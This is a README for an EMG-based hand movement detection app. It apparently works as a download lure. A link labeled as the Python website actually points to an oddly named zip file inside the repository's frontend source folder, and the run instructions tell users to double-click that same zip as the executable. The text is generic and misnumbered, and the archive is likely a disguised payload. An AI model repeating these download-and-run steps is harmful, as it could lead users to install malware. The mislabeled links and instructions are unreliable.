## 🚀 Getting Started

Welcome to the Hand Movement Detector application. This software uses advanced technology to detect hand movements based on electromagnetic signals. Whether you're interested in biomedical engineering, deep learning, or just curious about how technology can interpret hand gestures, you're in the right place.

### 🛠️ System Requirements

To run this application, ensure you have the following:

- **Operating System**: Windows 10 or later, macOS 10.15 or later, or Linux.
- **RAM**: At least 4 GB.
- **Processor**: Dual-core CPU with a minimum clock speed of 2.0 GHz.
- **Additional Software**: You may need Python 3.7 or later installed on your system. Check the [Python website](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip) for downloads.

2. Find the latest version listed at the top of the page.
3. Click the appropriate file for your operating system.
4. Download the file to your preferred location on your computer.

## 🎯 Features

- **EMG-Based Detection**: The application detects hand movements using signals captured from your muscles.
- **Transformer Model**: Leverages deep learning to improve accuracy in gesture recognition.
- **EMD-CCT Feature Extraction**: Utilizes advanced techniques for extracting important features from the signals.
- **Real-time Processing**: The software processes movements in real-time, providing instant feedback.
- **User-Friendly Interface**: Designed for anyone to use, regardless of technical background.

## 📊 How It Works

The application works by capturing electrical signals from your muscles. These signals are analyzed to detect various hand movements. The use of a Transformer model helps improve the detection accuracy, making it faster and more reliable.

1. **Signal Collection**: The software accesses the muscle signals through compatible sensors (not included).
2. **Feature Extraction**: Using EMD-CCT, important characteristics of the signals are highlighted for further analysis.
3. **Movement Detection**: The application then interprets these features to recognize specific gestures or movements.

## 🖥️ Running the Application

Once you have downloaded the application, follow these simple steps to run it:

1. Open the folder where you saved the downloaded file.
2. Double-click the executable file (e.g., `https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip`).
3. Follow the on-screen instructions to set up the application.
4. Connect your EMG sensors if necessary (refer to the sensor documentation for setup).
